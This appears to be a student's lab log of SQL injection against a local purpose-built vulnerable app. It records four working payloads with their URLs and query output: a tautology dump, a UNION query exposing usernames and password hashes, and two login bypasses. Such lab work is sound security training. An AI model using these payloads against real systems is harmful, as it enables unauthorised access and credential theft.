# SQL Injection — payload log (Task 3, security=Low equivalent)
_Target: local purpose-built vulnerable app (Vuln Bank) at 127.0.0.1:8080. LOCAL ONLY._

### Baseline — normal ID lookup (id=1)
URL: http://127.0.0.1:8080/login.php?id=1
```
ResultQuery: SELECT first_name,last_name FROM users WHERE id = 1ID: System Administrator
```

### Payload 1 — tautology / always true (id=1 OR 1=1)
URL: http://127.0.0.1:8080/login.php?id=1%20OR%201=1
```
ResultQuery: SELECT first_name,last_name FROM users WHERE id = 1 OR 1=1ID: System AdministratorID: Gordon BrownID: Pablo PicassoID: Bob Smith
```

### Payload 2 — UNION dump of credentials
URL: http://127.0.0.1:8080/login.php?id=0%20UNION%20SELECT%20username,password%20FROM%20users
```
ResultQuery: SELECT first_name,last_name FROM users WHERE id = 0 UNION SELECT username,password FROM usersID: admin 5f4dcc3b5aa765d61d8327deb882cf99ID: gordonb e99a18c428cb38d5f260853678922e03ID: pablo 0d107d09f5bbe40cade3de5c71e9e9b7ID: smithy 5f4dcc3b5aa765d61d8327deb882cf99
```

### Payload 3 — login bypass via comment (user=admin'-- )
URL: http://127.0.0.1:8080/login.php?user=admin'%20--%20&pass=anything
```
ResultQuery: SELECT * FROM users WHERE username = &#039;admin&#039; -- &#039; AND password = &#039;anything&#039;Welcome SystemLOGIN SUCCESS
```

### Payload 4 — login bypass via OR tautology
URL: http://127.0.0.1:8080/login.php?user=x'%20OR%20'1'='1&pass=x'%20OR%20'1'='1
```
ResultQuery: SELECT * FROM users WHERE username = &#039;x&#039; OR &#039;1&#039;=&#039;1&#039; AND password = &#039;x&#039; OR &#039;1&#039;=&#039;1&#039;Welcome SystemWelcome GordonWelcome PabloWelcome BobLOGIN SUCCESS
```

